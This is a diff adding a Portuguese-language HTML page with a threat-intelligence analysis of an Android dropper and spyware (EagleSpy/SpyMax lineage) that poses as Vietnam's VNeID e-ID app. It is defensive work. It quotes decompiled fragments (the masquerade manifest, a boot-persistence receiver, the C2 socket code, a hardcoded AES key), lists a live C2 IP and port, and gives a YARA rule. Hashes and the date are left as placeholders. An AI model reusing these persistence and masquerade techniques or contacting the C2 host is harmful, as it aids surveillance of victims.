@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spyware Android Disfarçado de VNeID — Família EagleSpy/SpyMax — Rives</title>
+<meta name="description" content="Análise de dropper Android de dois estágios que se disfarça do app oficial de e-ID do governo do Vietnã para instalar um RAT da linhagem EagleSpy/SpyMax.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Anton&family=Share+Tech+Mono&family=Chakra+Petch:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --black:#0a0a0b; --panel:#131315; --line:#2a2a2d;
+  --white:#f5f5f6; --white-dim:#e2e2e3;
+  --red:#e21323; --red-bright:#ff2f3c;
+  --display:"Anton","Chakra Petch",sans-serif;
+  --mono:"Share Tech Mono", ui-monospace, monospace;
+  --sans:"Chakra Petch", system-ui, sans-serif;
+  --space-s:clamp(0.75rem,0.6rem + 0.6vw,1.25rem);
+  --space-m:clamp(1.5rem,1.2rem + 1.2vw,2.5rem);
+  --space-l:clamp(2.5rem,2rem + 2.5vw,5rem);
+}
+*{ box-sizing:border-box; margin:0; padding:0; }
+html{ color-scheme:dark; }
+body{ background:var(--black); color:var(--white-dim); font-family:var(--sans); line-height:1.7; font-size:1.02rem; }
+a{ color:var(--red-bright); }
+:focus-visible{ outline:2px solid var(--red-bright); outline-offset:3px; }
+
+header.top{
+  padding:var(--space-s) var(--space-m); border-bottom:2px solid var(--red);
+  display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem;
+  position:sticky; top:0; background:color-mix(in srgb, var(--black) 92%, transparent); backdrop-filter:blur(6px); z-index:10;
+}
+header.top a{ font-family:var(--mono); font-size:.85rem; text-decoration:none; color:var(--white-dim); }
+header.top a:hover{ color:var(--red-bright); }
+
+main{ max-width:76ch; margin:0 auto; padding:var(--space-l) var(--space-m); }
+
+.slash{
+  display:inline-block; background:var(--red); color:var(--black);
+  font-family:var(--display); text-transform:uppercase; letter-spacing:.02em;
+  padding:.2rem .8rem .1rem; transform:skew(-10deg);
+  box-shadow:5px 5px 0 var(--black), 5px 5px 0 1px var(--line);
+  font-size:.78rem; margin-bottom:1rem;
+}
+.slash span{ display:inline-block; transform:skew(10deg); }
+
+h1{
+  font-family:var(--display); font-weight:400; text-transform:uppercase;
+  font-size:clamp(1.9rem,1.4rem + 2.4vw,3.1rem); line-height:1.05; letter-spacing:.005em;
+  color:var(--white); margin-bottom:1rem;
+}
+.meta{ font-family:var(--mono); font-size:.83rem; color:var(--white-dim); display:flex; gap:1.3rem; flex-wrap:wrap; margin-bottom:var(--space-m); }
+.meta strong{ color:var(--white); }
+.tlp{ color:var(--red-bright); font-weight:700; }
+
+.summary{
+  padding:var(--space-s) var(--space-m); background:var(--panel); border-left:3px solid var(--red);
+  margin-bottom:var(--space-l);
+}
+.summary dt{ font-family:var(--mono); font-size:.68rem; text-transform:uppercase; letter-spacing:.08em; color:var(--red-bright); margin-top:.8rem; }
+.summary dt:first-child{ margin-top:0; }
+.summary dd{ color:var(--white); }
+
+article section{ margin-top:var(--space-l); }
+article h2{
+  font-family:var(--display); font-weight:400; text-transform:uppercase; font-size:1.5rem;
+  color:var(--white); border-bottom:1px solid var(--line); padding-bottom:.6rem; margin-bottom:1.2rem;
+}
+article h3{
+  font-family:var(--mono); font-weight:700; font-size:.95rem; text-transform:uppercase; letter-spacing:.04em;
+  color:var(--red-bright); margin:1.6rem 0 .8rem;
+}
+article p{ margin-bottom:1rem; }
+article p.muted{ color:var(--white-dim); font-size:.9rem; }
+article ol, article ul{ margin:0 0 1rem 1.3rem; }
+article li{ margin-bottom:.4rem; }
+
+pre{ background:var(--panel); border:1px solid var(--line); padding:var(--space-s); overflow-x:auto; font-family:var(--mono); font-size:.82rem; margin:1rem 0; line-height:1.55; }
+code{ font-family:var(--mono); background:var(--panel); padding:.1rem .35rem; font-size:.88em; }
+pre code{ background:none; padding:0; }
+
+.pending{ color:var(--red-bright); font-weight:700; }
+
+/* ===== PRINTS DA PESQUISA ===== */
+figure{ margin:1.5rem 0; border:1px solid var(--line); background:var(--panel); }
+figure img{ width:100%; display:block; }
+figure .placeholder{
+  display:flex; align-items:center; justify-content:center; min-height:180px;
+  font-family:var(--mono); font-size:.8rem; color:var(--white-dim); text-align:center; padding:1.5rem;
+  border-bottom:1px solid var(--line);
+}
+figcaption{ font-family:var(--mono); font-size:.8rem; color:var(--white-dim); padding:.6rem .9rem; }
+figcaption strong{ color:var(--red-bright); }
+
+table.ioc-table{ width:100%; border-collapse:collapse; margin:1rem 0; font-family:var(--mono); font-size:.82rem; }
+table.ioc-table th, table.ioc-table td{ border:1px solid var(--line); padding:.55rem .7rem; text-align:left; vertical-align:top; }
+table.ioc-table th{ background:var(--panel); color:var(--red-bright); text-transform:uppercase; font-size:.68rem; letter-spacing:.06em; }
+
+.diamond{ text-align:center; }
+
+footer.bottom{ border-top:1px solid var(--line); padding:var(--space-m); text-align:center; font-family:var(--mono); font-size:.8rem; color:var(--white-dim); }
+</style>
+</head>
+<body>
+
+<header class="top">
+  <a href="../index.html">← voltar ao portfólio</a>
+  <a href="https://github.com/rives" target="_blank" rel="noopener">github ↗</a>
+</header>
+
+<main>
+  <article>
+    <header>
+      <p class="slash"><span>Cyber Threat Intelligence</span></p>
+      <h1>Spyware Android Disfarçado de Aplicativo Governamental Vietnamita (VNeID) — Família EagleSpy/SpyMax</h1>
+      <p class="meta">
+        <span class="tlp">TLP:CLEAR</span>
+        <span><strong>Autor:</strong> Rives</span>
+        <span><strong>Data:</strong> <span class="pending">[DATA DE PUBLICAÇÃO]</span></span>
+        <span><strong>Artefato:</strong> Aplicação Android (.apk) — dropper de dois estágios</span>
+      </p>
+    </header>
+
+    <!-- ================= 1. SUMÁRIO EXECUTIVO ================= -->
+    <section id="sumario">
+      <h2>1. Sumário Executivo</h2>
+      <p>Esta análise documenta um artefato Android malicioso de arquitetura <strong>dropper em dois estágios</strong>, cujo estágio final se disfarça visualmente do aplicativo <strong>VNeID</strong> — a aplicação oficial de identidade eletrônica (e-ID) do governo do Vietnã — com o objetivo de induzir a vítima a conceder um conjunto extenso de permissões sensíveis do sistema operacional Android.</p>
+      <p>O payload final foi identificado como pertencente à linhagem <strong>EagleSpy</strong>, uma variante derivada do código-fonte vazado da família <strong>SpyNote/SpyMax</strong>, RATs comerciais para Android amplamente reaproveitadas por múltiplos atores de ameaça devido à disponibilidade pública de seu builder.</p>
+
+      <table class="ioc-table">
+        <thead><tr><th>Item</th><th>Valor</th></tr></thead>
+        <tbody>
+          <tr><td>Package ID (dropper)</td><td><code>com.appd.instll.load</code></td></tr>
+          <tr><td>Package ID (payload)</td><td><code>com.found.hentai</code></td></tr>
+          <tr><td>Aplicativo legítimo imitado</td><td>VNeID (identidade digital, governo do Vietnã)</td></tr>
+          <tr><td>Família de malware</td><td>EagleSpy (linhagem SpyNote/SpyMax)</td></tr>
+          <tr><td>C2</td><td>103.253.23.8:7773 (socket TCP raw)</td></tr>
+          <tr><td>Criptografia de dados</td><td>AES-256/ECB, chave estática hardcoded</td></tr>
+          <tr><td>Persistência</td><td>Broadcast Receiver de boot + Device Administrator API</td></tr>
+          <tr><td>SHA256 (dropper)</td><td class="pending">[PREENCHER — sha256sum no arquivo original]</td></tr>
+          <tr><td>SHA256 (payload)</td><td class="pending">[PREENCHER — sha256sum no arquivo extraído]</td></tr>
+        </tbody>
+      </table>
+
+      <p>O artefato demonstra sofisticação <strong>desigual</strong>: forte ofuscação de identificadores de código combinada com práticas criptográficas fracas na camada de rede (Base64 sem cifra real para configuração de C2, AES em modo ECB sem IV) — um padrão consistente com reaproveitamento de builder comercial sem hardening adicional por parte do operador.</p>
+    </section>
+
+    <!-- ================= 2. DIAMOND MODEL ================= -->
+    <section id="diamond-model">
+      <h2>2. Diamond Model of Intrusion Analysis</h2>
+      <p>O Diamond Model organiza a intrusão em quatro vértices interligados — Adversário, Infraestrutura, Capacidade e Vítima — conectados por um evento de distribuição/instalação de app malicioso via engenharia social.</p>
+
+      <pre class="diamond"><code>                         ADVERSÁRIO
+                    (Não atribuído nesta análise;
+                 operador de builder EagleSpy/SpyMax,
+                  possivelmente múltiplos afiliados)
+                            |
+                            |
+       CAPACIDADE  ---------+---------  INFRAESTRUTURA
+   Dropper de 2 estágios              C2: 103.253.23.8:7773
+   com.appd.instll.load  →            Socket TCP raw
+   com.found.hentai (payload)         Sem uso de domínio/DNS
+   RAT EagleSpy/SpyMax:                (IP hardcoded no APK)
+   - Captura SMS/Contatos/Chamadas
+   - Câmera e microfone
+   - Geolocalização
+   - Device Admin abuse
+   - AES-256/ECB p/ payload de dados
+                            |
+                            |
+                         VÍTIMA
+              Usuários Android induzidos a instalar
+              um app se passando pelo VNeID
+              (sugere foco em usuários vietnamitas
+              ou falantes de vietnamita; presença de
+              permissões específicas para OEMs Oppo/
+              Oplus/Huawei reforça foco em mercado asiático)</code></pre>
+
+      <h3>Notas de atribuição</h3>
+      <p>Esta análise <strong>não estabelece atribuição a um grupo específico</strong>. A string <code>"EagleSpy"</code> embutida como chave de protocolo/identificador de conexão é um indicador forte de linhagem de ferramenta (builder), não necessariamente de autoria — builders dessa família circulam publicamente e são reutilizados por atores não relacionados entre si. Recomenda-se tratar essa amostra como <strong>atividade genérica de e-crime/spyware comercial</strong> até que IOCs de infraestrutura sejam correlacionados com clusters de campanha conhecidos (VirusTotal, MalwareBazaar, Koodous).</p>
+
+      <h3>Vetor de distribuição presumido</h3>
+      <p>Não confirmado diretamente na análise estática, mas a arquitetura (dropper + engenharia social visual de app governamental) é consistente com distribuição via <strong>sideloading</strong> fora da Google Play Store. A presença de uma verificação de intent para <code>messenger.com</code> e o package <code>com.orca</code> (KakaoTalk) nas queries do manifest sugere possível interesse do malware em interoperar ou detectar apps de mensageria instalados na vítima — hipótese que requer validação por análise dinâmica adicional.</p>
+    </section>
+
+    <!-- ================= 3. METODOLOGIA ================= -->
+    <section id="metodologia">
+      <h2>3. Metodologia de Análise</h2>
+      <p>A análise foi conduzida via <strong>engenharia reversa estática</strong>, utilizando o JADX (GUI) para descompilação de bytecode DEX para pseudocódigo Java, complementado por CyberChef para deobfuscação manual de strings codificadas em Base64.</p>
+      <ol>
+        <li>Reconhecimento estrutural (AndroidManifest.xml, BuildConfig, árvore de packages)</li>
+        <li>Identificação de arquitetura multi-estágio via análise do fluxo de decisão da Activity inicial (<code>splash</code>)</li>
+        <li>Extração do payload de segundo estágio embutido em <code>assets/</code></li>
+        <li>Análise isolada do payload como projeto JADX separado</li>
+        <li>Mapeamento de permissões declaradas → capacidades de coleta de dados</li>
+        <li>Localização e deobfuscação manual da lógica de C2 e criptografia</li>
+      </ol>
+      <p class="muted">Não foi realizada análise dinâmica (execução em sandbox/emulador) nesta fase — os achados refletem exclusivamente comportamento inferido por análise estática, e permanecem como itens de validação recomendados na Seção 7.</p>
+
+      <figure>
+        <span class="placeholder">[ PRINT: visão geral do projeto no JADX — árvore de packages do dropper ]</span>
+        <figcaption><strong>Fig. 1 —</strong> estrutura de packages do APK original aberta no JADX, mostrando a separação entre código do dropper e o payload embutido em <code>assets/</code>.</figcaption>
+      </figure>
+    </section>
+
+    <!-- ================= 4. ANÁLISE TÉCNICA ================= -->
+    <section id="analise-tecnica">
+      <h2>4. Análise Técnica</h2>
+
+      <h3>4.1 Estágio 1 — Dropper (com.appd.instll.load)</h3>
+      <p>O <code>BuildConfig</code> do artefato revela metadados incomuns para uma aplicação legítima:</p>
+      <pre><code>APPLICATION_ID = "com.appd.instll.load"
+BUILD_TYPE     = "release"
+FLAVOR         = "payload"
+VERSION_CODE   = 331165
+VERSION_NAME   = "3.31.165"</code></pre>
+      <p>A build flavor nomeada literalmente <code>"payload"</code>, combinada com a estrutura de package <code>instll.load</code> (contração de installer + loader), constitui um indicador textual forte de que este artefato é um componente de estágio intermediário em uma cadeia de infecção, não a ameaça final.</p>
+
+      <p><strong>Lógica de decisão (classe <code>splash</code>, ponto de entrada da aplicação):</strong></p>
+      <pre><code>private static String TargetBaseid = "com.found.hentai";
+
+public static boolean isAppAvailable(Context context, String str) {
+    try {
+        context.getPackageManager().getApplicationInfo(str, 0);
+        return true;
+    } catch (PackageManager.NameNotFoundException unused) {
+        return false;
+    }
+}</code></pre>
+      <p>A verificação de presença do pacote-alvo utiliza o padrão idiomático do Android SDK — <code>PackageManager.getApplicationInfo()</code> capturado via try/catch, já que a API não expõe um método booleano direto de checagem de instalação.</p>
+
+      <p>O comportamento subsequente se ramifica em dois fluxos, ambos com atraso de 1 segundo via <code>Timer</code>/<code>TimerTask</code>:</p>
+      <ul>
+        <li><strong>Se <code>com.found.hentai</code> já está instalado:</strong> o dropper invoca <code>getLaunchIntentForPackage()</code> e abre o app existente diretamente, finalizando-se em seguida — comportamento que minimiza a percepção de anomalia pelo usuário.</li>
+        <li><strong>Se não está instalado:</strong> o dropper invoca uma Activity interna (identificador ofuscado <code>oxgouacygcwohqzcuxomeqcxomnxun3</code>), responsável por extrair e/ou disparar a instalação do payload embutido em <code>assets/childapp.apk</code>.</li>
+      </ul>
+      <p>Essa mesma Activity interna também contém lógica de checagem de idioma padrão do sistema via <code>Locale.getDefault().getLanguage()</code>, sugerindo uma possível camada de targeting geográfico/linguístico antes da ativação do payload. <strong>A lista completa de idiomas-alvo não foi totalmente extraída</strong> (ver Seção 7).</p>
+
+      <figure>
+        <span class="placeholder">[ PRINT: classe splash decompilada no JADX, com o fluxo isAppAvailable → Timer destacado ]</span>
+        <figcaption><strong>Fig. 2 —</strong> lógica de decisão do dropper: verificação de instalação do payload e ramificação do fluxo.</figcaption>
+      </figure>
+
+      <h3>4.2 Estágio 2 — Payload (com.found.hentai, disfarçado de VNeID)</h3>
+      <p>O payload extraído de <code>assets/childapp.apk</code> corresponde ao package <code>com.found.hentai</code> — confirmando o alvo de verificação do dropper — e é o componente com capacidade real de spyware.</p>
+
+      <p><strong>Camuflagem visual:</strong></p>
+      <pre><code>&lt;application android:label="@string/pcsnimportedz59" android:icon="@drawable/developerf70" ...&gt;
+    &lt;activity
+        android:label="VNeID"
+        android:icon="@drawable/skinicon"
+        android:name="com.found.gybb....MainActivity"
+        android:exported="true"&gt;
+        &lt;intent-filter&gt;
+            &lt;action android:name="android.intent.action.MAIN"/&gt;
+            &lt;category android:name="android.intent.category.LAUNCHER"/&gt;
+        &lt;/intent-filter&gt;
+    &lt;/activity&gt;</code></pre>
+      <p>O label no nível <code>&lt;application&gt;</code> é uma string ofuscada não visível ao usuário; o label <strong>efetivamente exibido no launcher</strong> — por sobrescrita no nível da Activity com o intent-filter de MAIN/LAUNCHER — é <code>"VNeID"</code>, com ícone dedicado, replicando a identidade visual do aplicativo oficial de e-ID do governo do Vietnã.</p>
+
+      <figure>
+        <span class="placeholder">[ PRINT: comparação lado a lado — ícone/nome do app real VNeID vs. o app malicioso instalado na tela inicial ]</span>
+        <figcaption><strong>Fig. 3 —</strong> comparação visual entre o app oficial VNeID e a camuflagem aplicada pelo payload — evidência central da técnica de masquerading (T1655.001).</figcaption>
+      </figure>
+
+      <p><strong>Permissões declaradas (subset relevante):</strong></p>
+      <table class="ioc-table">
+        <thead><tr><th>Permissão</th><th>Capacidade inferida</th></tr></thead>
+        <tbody>
+          <tr><td><code>READ_SMS</code>, <code>SEND_SMS</code></td><td>Interceptação/envio de SMS (potencial bypass de 2FA)</td></tr>
+          <tr><td><code>READ_CALL_LOG</code></td><td>Exfiltração de histórico de chamadas</td></tr>
+          <tr><td><code>READ_CONTACTS</code>, <code>GET_ACCOUNTS</code></td><td>Exfiltração de contatos e contas cadastradas</td></tr>
+          <tr><td><code>CAMERA</code></td><td>Captura de imagem/vídeo</td></tr>
+          <tr><td><code>RECORD_AUDIO</code></td><td>Captura de áudio ambiente</td></tr>
+          <tr><td><code>ACCESS_FINE_LOCATION</code>, <code>ACCESS_COARSE_LOCATION</code></td><td>Geolocalização</td></tr>
+          <tr><td><code>CALL_PHONE</code></td><td>Discagem sem interação do usuário</td></tr>
+          <tr><td><code>DISABLE_KEYGUARD</code></td><td>Bypass de tela de bloqueio</td></tr>
+          <tr><td><code>RECEIVE_BOOT_COMPLETED</code></td><td>Persistência via reinicialização</td></tr>
+          <tr><td><code>REQUEST_IGNORE_BATTERY_OPTIMIZATIONS</code></td><td>Evasão de otimizações de bateria (mantém processo vivo)</td></tr>
+          <tr><td><code>REQUEST_INSTALL_PACKAGES</code>, <code>REQUEST_DELETE_PACKAGES</code></td><td>Instalação/remoção de outros pacotes</td></tr>
+          <tr><td><code>oppo.permission.OPPO_COMPONENT_SAFE</code>, <code>oplus.permission.OPLUS_COMPONENT_SAFE</code>, <code>com.huawei.permission.external_app_settings.USE_COMPONENT</code></td><td>Permissões proprietárias de OEM para contornar restrições de autostart em background — indica engenharia dedicada para fabricantes populares em mercados asiáticos</td></tr>
+        </tbody>
+      </table>
+
+      <figure>
+        <span class="placeholder">[ PRINT: lista completa de permissões do AndroidManifest.xml, visualizada no JADX ou APKTool ]</span>
+        <figcaption><strong>Fig. 4 —</strong> permissões declaradas no manifest do payload — base para a tabela de capacidades acima.</figcaption>
+      </figure>
+
+      <p><strong>Componente de persistência via boot (BootReceiver):</strong></p>
+      <pre><code>&lt;receiver
+    android:name="....BootReceiver"
+    android:permission="android.permission.RECEIVE_BOOT_COMPLETED"
+    android:exported="true"&gt;
+    &lt;intent-filter android:priority="999"&gt;
+        &lt;action android:name="android.intent.action.BOOT_COMPLETED"/&gt;
+        &lt;action android:name="android.intent.action.ACTION_BOOT_COMPLETED"/&gt;
+        &lt;action android:name="android.intent.action.QUICKBOOT_POWERON"/&gt;
+        &lt;action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/&gt;
+        &lt;action android:name="android.intent.action.REBOOT"/&gt;
+        &lt;action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/&gt;
+        &lt;action android:name="miui.intent.action.BOOT_COMPLETEDT"/&gt;
+    &lt;/intent-filter&gt;
+&lt;/receiver&gt;</code></pre>
+      <p>A cobertura ampla de actions (incluindo variantes específicas de HTC e MIUI/Xiaomi) demonstra esforço deliberado para garantir persistência entre reinicializações através de diferentes fabricantes/customizações de Android.</p>
+
+      <p><strong>Abuso de Device Administrator API (AdminReceiver):</strong> o payload registra um componente que estende <code>DeviceAdminReceiver</code>, protegido pela permissão de sistema <code>BIND_DEVICE_ADMIN</code>. Uma vez concedida pelo usuário (via prompt de sistema, tipicamente induzido por engenharia social), essa API dificulta a desinstalação direta do app.</p>
+
+      <p><strong>Componente de ocultação adicional</strong> — uma segunda Activity com:</p>
+      <pre><code>android:persistent="true"
+android:excludeFromRecents="true"
+android:exported="true"
+android:alwaysRetainTaskState="true"</code></pre>
+      <p><code>excludeFromRecents</code> remove o componente da lista de apps recentes; <code>persistent="true"</code> busca manter o processo permanentemente ativo — reforçando a estratégia de persistência multi-camada observada.</p>
+
+      <figure>
+        <span class="placeholder">[ PRINT: prompt de "Ativar administrador do dispositivo" exibido pelo app, se reproduzido em análise dinâmica ]</span>
+        <figcaption><strong>Fig. 5 —</strong> engenharia social usada para induzir a concessão de privilégios de Device Admin.</figcaption>
+      </figure>
+
+      <h3>4.3 Comando e Controle (C2)</h3>
+      <p>A comunicação com o servidor de C2 é implementada via <strong>socket TCP raw</strong> (não HTTP/HTTPS), na classe <code>SecondarySocket</code>:</p>
+      <pre><code>Socket socket3 = new Socket(
+    InetAddress.getByName(
+        utilities.eosjvohlvdszzfnoawempbvgtfrhiukwdrdirywuhpeetixbkj45(initializeService.ClientHost)
+    ),
+    Integer.parseInt(
+        utilities.eosjvohlvdszzfnoawempbvgtfrhiukwdrdirywuhpeetixbkj45(initializeService.ClientPort)
+    )
+);</code></pre>
+      <p>Os valores de host e porta são armazenados como strings codificadas em Base64 na classe <code>initializeService</code>, decodificados em runtime por uma função utilitária de nome ofuscado, confirmada como um decoder Base64 simples, sem camada adicional de cifra:</p>
+      <pre><code>ClientHost (Base64): MTAzLjI1My4yMy44   →  Decoded: 103.253.23.8
+ClientPort (Base64): Nzc3Mw==            →  Decoded: 7773</code></pre>
+      <p><strong>IOC de rede confirmado:</strong> <code>103.253.23.8:7773</code></p>
+      <p>A mesma função de decodificação revela uma "chave de conexão" hardcoded:</p>
+      <pre><code>Base64: RWFnbGVTcHk=  →  Decoded: "EagleSpy"</code></pre>
+      <p>Essa string confirma a linhagem/identificação do builder utilizado pelo operador.</p>
+
+      <figure>
+        <span class="placeholder">[ PRINT: CyberChef decodificando os três valores Base64 acima (host, porta, chave "EagleSpy") ]</span>
+        <figcaption><strong>Fig. 6 —</strong> deobfuscação das strings de configuração de C2 via recipe Base64 no CyberChef.</figcaption>
+      </figure>
+
+      <h3>4.4 Criptografia de Payload de Dados</h3>
+      <p>A classe <code>EncryptionCUtils</code> implementa criptografia simétrica AES para os dados trocados com o C2:</p>
+      <pre><code>private static final String AES_ALGORITHM = "AES";
+private static final String SECRET_KEY = "93b89a273c1fbe59073af7bd9adfa6c0";
+
+public static String encrypt(String str) throws Exception {
+    SecretKeySpec secretKeySpec = new SecretKeySpec(SECRET_KEY.getBytes(), AES_ALGORITHM);
+    Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
+    cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec);
+    return Base64.encodeToString(cipher.doFinal(str.getBytes()), Base64.DEFAULT);
+}</code></pre>
+
+      <p><strong>Observações críticas de fragilidade criptográfica:</strong></p>
+      <ul>
+        <li>A chamada <code>Cipher.getInstance("AES")</code>, sem especificação explícita de modo/padding, resolve por padrão para <strong>AES/ECB/PKCS5Padding</strong> no provider padrão do Android/JCE. O modo ECB não utiliza vetor de inicialização (IV), fazendo com que blocos de texto plano idênticos produzam blocos de texto cifrado idênticos.</li>
+        <li>A chave, com 32 caracteres hexadecimais usados diretamente como bytes ASCII (não convertidos de hex para 16 bytes), resulta em uma chave efetiva de 32 bytes — caracterizando <strong>AES-256</strong>.</li>
+        <li>A chave é <strong>estática e hardcoded no APK</strong>, sem qualquer derivação dinâmica (KDF) ou proteção adicional. Isso permite a qualquer analista com acesso ao APK decifrar retroativamente qualquer tráfego de C2 capturado, caso a chave permaneça constante entre amostras da mesma campanha.</li>
+      </ul>
+
+      <figure>
+        <span class="placeholder">[ PRINT: classe EncryptionCUtils decompilada no JADX, com a SECRET_KEY hardcoded destacada ]</span>
+        <figcaption><strong>Fig. 7 —</strong> localização da chave AES estática dentro do código decompilado.</figcaption>
+      </figure>
+    </section>
+
+    <!-- ================= 5. IOCs ================= -->
+    <section id="iocs">
+      <h2>5. Indicadores de Comprometimento (IOCs)</h2>
+      <table class="ioc-table">
+        <thead><tr><th>Tipo</th><th>Valor</th><th>Contexto</th></tr></thead>
+        <tbody>
+          <tr><td>Package Name (dropper)</td><td><code>com.appd.instll.load</code></td><td>Estágio 1 — installer/loader</td></tr>
+          <tr><td>Package Name (payload)</td><td><code>com.found.hentai</code></td><td>Estágio 2 — RAT EagleSpy disfarçado de VNeID</td></tr>
+          <tr><td>SHA256 (dropper)</td><td class="pending">[PREENCHER]</td><td>Hash do APK original submetido à análise</td></tr>
+          <tr><td>SHA256 (payload)</td><td class="pending">[PREENCHER]</td><td>Hash de <code>childapp.apk</code> extraído de <code>assets/</code></td></tr>
+          <tr><td>C2 IP:Porta</td><td>103.253.23.8:7773</td><td>Socket TCP raw, decodificado de Base64</td></tr>
+          <tr><td>Chave AES (C2 payload)</td><td>93b89a273c1fbe59073af7bd9adfa6c0</td><td>AES-256/ECB hardcoded</td></tr>
+          <tr><td>String de builder</td><td>EagleSpy</td><td>Decodificada de <code>RWFnbGVTcHk=</code></td></tr>
+          <tr><td>App imitado</td><td>VNeID</td><td>Identidade digital, governo do Vietnã — engenharia social visual</td></tr>
+        </tbody>
+      </table>
+      <p class="muted">Recomenda-se validar <code>com.found.hentai</code> e o hash SHA256 do payload contra VirusTotal/MalwareBazaar/Koodous antes da publicação, para checar se a amostra já está catalogada publicamente e correlacionar com campanhas conhecidas.</p>
+    </section>
+
+    <!-- ================= 6. MITRE ATT&CK ================= -->
+    <section id="attck">
+      <h2>6. Mapeamento MITRE ATT&amp;CK for Mobile</h2>
+      <p class="muted">Todas as técnicas abaixo foram validadas contra a matriz Mobile vigente do MITRE ATT&amp;CK (consultado em julho/2026). Reconfirme IDs em <a href="https://attack.mitre.org/matrices/mobile/" target="_blank" rel="noopener">attack.mitre.org/matrices/mobile</a> antes de publicar.</p>
+      <table class="ioc-table">
+        <thead><tr><th>Tática</th><th>Técnica / Sub-técnica</th><th>ID</th><th>Evidência observada</th></tr></thead>
+        <tbody>
+          <tr><td>Defense Evasion</td><td>Masquerading: Match Legitimate Name or Location</td><td>T1655.001</td><td>Label da Activity principal sobrescrito para "VNeID" com ícone dedicado</td></tr>
+          <tr><td>Persistence</td><td>Event Triggered Execution: Broadcast Receivers</td><td>T1624.001</td><td>BootReceiver com múltiplas actions de boot (variantes HTC/MIUI)</td></tr>
+          <tr><td>Privilege Escalation</td><td>Abuse Elevation Control Mechanism: Device Administrator Permissions</td><td>T1626.001</td><td>AdminReceiver estendendo DeviceAdminReceiver</td></tr>
+          <tr><td>Collection</td><td>Protected User Data: SMS Messages</td><td>T1636.004</td><td>Permissões READ_SMS/SEND_SMS</td></tr>
+          <tr><td>Collection</td><td>Protected User Data: Call Log</td><td>T1636.002</td><td>Permissão READ_CALL_LOG</td></tr>
+          <tr><td>Collection</td><td>Protected User Data: Contact List</td><td>T1636.003</td><td>Permissões READ_CONTACTS/GET_ACCOUNTS</td></tr>
+          <tr><td>Collection</td><td>Audio Capture</td><td>T1429</td><td>Permissão RECORD_AUDIO</td></tr>
+          <tr><td>Collection</td><td>Video Capture</td><td>T1512</td><td>Permissão CAMERA</td></tr>
+          <tr><td>Collection</td><td>Location Tracking</td><td>T1430</td><td>Permissões ACCESS_FINE/COARSE_LOCATION</td></tr>
+          <tr><td>Command and Control</td><td>Non-Standard Port</td><td>T1509</td><td>Canal C2 via socket TCP raw na porta 7773</td></tr>
+          <tr><td>Defense Evasion</td><td>Obfuscated Files or Information</td><td>T1406*</td><td>Identificadores aleatórios; C2 e chave codificados em Base64</td></tr>
+        </tbody>
+      </table>
+      <p class="muted">*Nomenclaturas de "ofuscação" na matriz Mobile têm histórico de reorganização entre versões; valide o ID exato na versão vigente da matriz antes de finalizar o post.</p>
+    </section>
+
+    <!-- ================= 7. LIMITAÇÕES ================= -->
+    <section id="limitacoes">
+      <h2>7. Limitações e Itens Pendentes de Validação</h2>
+      <ol>
+        <li><strong>Lista completa de idiomas-alvo:</strong> a chamada <code>Locale.getDefault().getLanguage()</code> foi localizada, mas a lista/contagem exata de idiomas comparados na lógica condicional não foi extraída até o fechamento deste relatório.</li>
+        <li><strong>Hashes SHA256:</strong> ambos os campos precisam ser preenchidos com o valor real calculado (<code>sha256sum</code>) antes da publicação.</li>
+        <li><strong>Confirmação de execução real do payload:</strong> a análise foi inteiramente estática. Recomenda-se análise da classe <code>oxgouacygcwohqzcuxomeqcxomnxun3</code> para confirmação direta do fluxo de instalação.</li>
+        <li><strong>Atribuição:</strong> nenhuma atribuição a grupo/campanha específica é feita neste relatório; a string "EagleSpy" indica linhagem de ferramenta, não autoria confirmada.</li>
+        <li><strong>Vetor de distribuição:</strong> presumido como sideloading/engenharia social, mas não confirmado por telemetria externa.</li>
+      </ol>
+    </section>
+
+    <!-- ================= 8. RECOMENDAÇÕES ================= -->
+    <section id="recomendacoes">
+      <h2>8. Recomendações de Detecção e Mitigação</h2>
+      <ul>
+        <li><strong>Usuários finais:</strong> desconfiar de aplicativos governamentais distribuídos fora de canais oficiais; revisar periodicamente "Administradores do dispositivo" em Configurações de Segurança.</li>
+        <li><strong>Blue team:</strong> monitorar conexões de saída em portas não-padrão (ex: 7773); alertar sobre apps com <code>REQUEST_INSTALL_PACKAGES</code> combinado a <code>excludeFromRecents</code> e <code>persistent=true</code>.</li>
+        <li><strong>Threat hunting:</strong> buscar outras amostras reutilizando a mesma chave AES hardcoded (<code>93b89a273c1fbe59073af7bd9adfa6c0</code>) — reaproveitamento de chave entre variantes é comum em builders comerciais e pode revelar amostras irmãs da mesma campanha.</li>
+      </ul>
+
+      <p><strong>Regra YARA (esqueleto — refine com bytes/strings específicos da amostra):</strong></p>
+      <pre><code>rule EagleSpy_VNeID_Dropper_Payload
+{
+    meta:
+        description = "Detecta artefatos da cadeia dropper->payload disfarcado de VNeID (linhagem EagleSpy/SpyMax)"
+        author = "Rives"
+        date = "2026-07-22"
+
+    strings:
+        $pkg_dropper = "com.appd.instll.load"
+        $pkg_payload = "com.found.hentai"
+        $c2_key = "RWFnbGVTcHk="
+        $c2_host_b64 = "MTAzLjI1My4yMy44"
+
+    condition:
+        any of them
+}</code></pre>
+    </section>
+
+    <!-- ================= 9. CONCLUSÃO ================= -->
+    <section id="conclusao">
+      <h2>9. Conclusão</h2>
+      <p>O artefato analisado representa um exemplo bem documentado de spyware Android comercial (linhagem EagleSpy/SpyMax) empregando arquitetura de dropper em dois estágios e engenharia social por imitação de identidade visual de aplicativo governamental legítimo (VNeID). A amostra combina táticas de persistência robustas (Device Admin + Broadcast Receivers multi-OEM) com uma camada de proteção de configuração de C2 tecnicamente fraca (Base64 sem cifra, AES em modo ECB com chave estática), permitindo decodificação completa da infraestrutura de C2 e do mecanismo de criptografia por meio de engenharia reversa estática padrão, sem necessidade de quebra de criptografia ou análise dinâmica.</p>
